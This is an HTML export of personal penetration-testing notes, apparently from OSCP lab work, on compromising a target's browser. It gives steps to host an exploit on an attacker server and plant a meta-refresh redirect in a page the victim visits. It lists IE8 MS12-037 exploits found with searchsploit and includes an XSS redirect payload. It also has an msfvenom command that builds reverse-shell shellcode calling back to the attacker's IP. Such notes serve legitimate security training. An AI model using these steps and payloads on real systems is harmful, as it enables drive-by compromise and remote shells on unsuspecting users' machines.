<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Browser Exploitation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Browser Exploitation</h1></strong><br />If you&#39;ve found an exploit for a browser and have access to a web page which you know a target user regularly accesses, you might be able to exploit their browser.<br /><br />The first step is to serve the browser exploit on a web server where you can host it, <br />like your own web server or an intranet website within a network.<br />For example, <code>http://10.11.0.184:8080/blah</code><br /><br />Then, on the web page the user frequently visits, you can insert a redirect to your exploit<br />An easy to perform redirect is using a <code>&lt;meta&gt;</code> tag.<br /><a href="https://www.w3docs.com/snippets/html/how-to-redirect-a-web-page-in-html.html">https://www.w3docs.com/snippets/html/how-to-redirect-a-web-page-in-html.html</a><br /><div class="codebox"><div class="codebox">root@core:/var/corehttp#&nbsp;nano&nbsp;nina.html<br />&lt;html&gt;<br />&lt;head&gt;<br />&lt;title&gt;Stats&nbsp;for&nbsp;Nina&lt;/title&gt;<br />&lt;meta&nbsp;http-equiv=&quot;refresh&quot;&nbsp;content=&quot;5;&nbsp;url=http://10.11.0.184:8080/blah&quot;&nbsp;/&gt;<br />[...]</div></div><br /><br />Because browser exploitation can be so specific to the browser and the user being targeted, the examples included below are past examples that can be learned from and adapted to your current situation.<br /><br /><strong><h2>## Internet Explorer 8 - MS12-037 Fixed Col Span ID</h2></strong><br /><strong>Examples</strong><br />• oscp 10.11.1.218 - Observer<br /><br />This exploit can be a bit finnicky to get working.<br /><br />There are multiple versions of this exploit which each exploit different protections.<br /><div class="codebox"><div class="codebox">┌─[✗]─[root@parrot]─[/oscp/public]<br />└──╼&nbsp;#searchsploit&nbsp;-e&nbsp;&quot;internet&nbsp;explorer&nbsp;8&quot;&nbsp;--exclude=&quot;dos&quot;<br />-------------------------------------------------------------------------<br />&nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br />-------------------------------------------------------------------------<br />[...]<br />Microsoft&nbsp;Internet&nbsp;Explorer&nbsp;8&nbsp;-&nbsp;Fixed&nbsp;Col&nbsp;Span&nbsp;ID&nbsp;(Full&nbsp;ASLR&nbsp;+&nbsp;DEP&nbsp;+&nbsp;EME&nbsp;|&nbsp;exploits/windows/remote/33944.html<br />Microsoft&nbsp;Internet&nbsp;Explorer&nbsp;8&nbsp;-&nbsp;Fixed&nbsp;Col&nbsp;Span&nbsp;ID&nbsp;(Full&nbsp;ASLR&nbsp;+&nbsp;DEP&nbsp;+&nbsp;EME&nbsp;|&nbsp;exploits/windows/remote/34815.html<br />Microsoft&nbsp;Internet&nbsp;Explorer&nbsp;8&nbsp;-&nbsp;Fixed&nbsp;Col&nbsp;Span&nbsp;ID&nbsp;(Full&nbsp;ASLR&nbsp;+&nbsp;DEP&nbsp;+&nbsp;EME&nbsp;|&nbsp;exploits/windows/remote/35273.html<br />Microsoft&nbsp;Internet&nbsp;Explorer&nbsp;8&nbsp;-&nbsp;Fixed&nbsp;Col&nbsp;Span&nbsp;ID&nbsp;(Full&nbsp;ASLR&nbsp;+&nbsp;DEP&nbsp;Bypas&nbsp;|&nbsp;exploits/windows/remote/24017.html</div></div><br /><br /><strong><h3>### Tips</h3></strong><br />• Test the exploit on your Windows 7 machine first, just to verify you&#39;ve got it working<br />• Don&#39;t copy/paste from exploit-db, it can cause errors (because of line-ending stuff) - download with <code>wget</code> instead<br />• How you deliver the exploit is important I think (just try a hard redirect)<br />• Make sure the shellcode size is the same size as the original - 342 bytes - no longer no shorter<br />• Make sure you&#39;re using the right version to bypass the right proections<br />   ◇ or just try metasploit<br />• IT CAN TAKE ~30 SECONDS TO RUN, WAIT<br /><br />Browser XSS to try:<br />• <code>&lt;script&gt;document.location=&#39;http://10.11.0.184:8080/&#39;&lt;/script&gt;</code> - worked for me<br /><br /><strong><h3>### 1. Generate shellcode</h3></strong><br />The exploit recommends you match your shellcode to the original shellcode size - <code>342 bytes</code> <br />A standard <code>windows/shell_reverse_tcp shellcode</code> is 324 bytes long, so add 18 bytes of NOPs with <code>-n 18</code> :<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.184 LPORT=443 -f js_le -n 18</code><br /><br /><strong><h3>### 2. Serve</h3></strong><br /><code>python3 -m http.server</code><br /></div>
</body>
</html>
